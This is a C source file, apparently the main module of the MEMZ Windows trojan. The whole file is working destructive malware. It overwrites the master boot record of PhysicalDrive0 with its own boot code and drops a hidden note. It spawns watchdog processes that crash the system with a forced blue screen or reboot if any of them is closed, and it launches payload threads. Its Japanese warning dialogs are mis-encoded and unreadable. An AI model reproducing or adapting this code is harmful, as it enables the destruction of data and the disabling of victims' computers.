#include "MEMZ.h"

INT scrw, scrh;

INT
WINAPI
WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	PWSTR pCmdLine,
	INT nCmdShow
)
{
	scrw = GetSystemMetrics(SM_CXSCREEN);
	scrh = GetSystemMetrics(SM_CYSCREEN);

	int argc;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc > 1) {
		if (!lstrcmpW(argv[1], L"/watchdog")) {
			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);

			WNDCLASSEXA c;
			c.cbSize = sizeof(WNDCLASSEXA);
			c.lpfnWndProc = WindowProc;
			c.lpszClassName = "hax";
			c.style = 0;
			c.cbClsExtra = 0;
			c.cbWndExtra = 0;
			c.hInstance = NULL;
			c.hIcon = 0;
			c.hCursor = 0;
			c.hbrBackground = 0;
			c.lpszMenuName = NULL;
			c.hIconSm = 0;

			RegisterClassExA(&c);

			HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

			MSG msg;
			while (GetMessage(&msg, NULL, 0, 0) > 0) {
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	}
	else {
		// Another very ugly formatting
		if (MessageBoxA(NULL, "�����s�����\�t�g�E�F�A�́A�}���E�F�A�Ƃ݂Ȃ������̂ł��B\r\n\
���̃}���E�F�A�́A���Ȃ��̃R���s���[�^�ɊQ��^���A�g�p�s�\�ɂ��܂��B\r\n\
�������s�������킩��Ȃ��܂܂��̃��b�Z�[�W���\�����ꂽ�ꍇ�́A�u�������v�����������ŁA�����N����܂���B\r\n\
���̃}���E�F�A���������邩�m���Ă��āA���S�Ȋ����g���ăe�X�g���Ă���̂ł���΁B \
�u�͂��v�������ċN�����܂��B\r\n\r\n\
���̃}���E�F�A�����s���āA�}�V�����g���Ȃ��Ȃ邱�Ƃ�]��ł��܂����H", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "����͍Ō�̌x���ł��I\r\n\r\n\
���̃}���E�F�A���g�p���Ĕ������������Ȃ鑹�Q�ɑ΂��Ă��A����҂͈�؂̐ӔC�𕉂��܂���B\r\n\
����ł����s���܂����H", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
			ExitProcess(0);
		}

		wchar_t* fn = (wchar_t*)LocalAlloc(LMEM_ZEROINIT, 8192 * 2);
		GetModuleFileName(NULL, fn, 8192);

		for (int i = 0; i < 5; i++)
			ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);

		SHELLEXECUTEINFO info;
		info.cbSize = sizeof(SHELLEXECUTEINFO);
		info.lpFile = fn;
		info.lpParameters = L"/main";
		info.fMask = SEE_MASK_NOCLOSEPROCESS;
		info.hwnd = NULL;
		info.lpVerb = NULL;
		info.lpDirectory = NULL;
		info.hInstApp = NULL;
		info.nShow = SW_SHOWDEFAULT;

		ShellExecuteEx(&info);

		SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);

		ExitProcess(0);
	}

	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (drive == INVALID_HANDLE_VALUE)
		ExitProcess(2);

	unsigned char* bootcode = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 65536);

	// Join the two code parts together
	int i = 0;
	for (; i < code_len; i++)
		*(bootcode + i) = *(code + i);

	DWORD wb;
	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
		ExitProcess(3);

	CloseHandle(drive);

	HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, 0);

	if (note == INVALID_HANDLE_VALUE)
		ExitProcess(4);

	if (!WriteFile(note, msg, msg_len, &wb, NULL))
		ExitProcess(5);

	CloseHandle(note);
	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);

	for (int p = 0; p < nPayloads; p++) {
		Sleep(payloads[p].delay);
		CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
	}

	for (;;) {
		Sleep(10000);
	}
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
		killWindows();
		return 0;
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}

DWORD WINAPI watchdogThread(LPVOID parameter) {
	int oproc = 0;

	char* fn = (char*)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);

	Sleep(1000);

	for (;;) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		Process32First(snapshot, &proc);

		int nproc = 0;
		do {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
			char* fn2 = (char*)LocalAlloc(LMEM_ZEROINIT, 512);
			GetProcessImageFileNameA(hProc, fn2, 512);

			if (!lstrcmpA(fn, fn2)) {
				nproc++;
			}

			CloseHandle(hProc);
			LocalFree(fn2);
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (nproc < oproc) {
			killWindows();
		}

		oproc = nproc;

		Sleep(10);
	}
}

void killWindows() {
	// Show cool MessageBoxes
	for (int i = 0; i < 20; i++) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
		Sleep(100);
	}

	killWindowsInstant();
}

void killWindowsInstant() {
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}

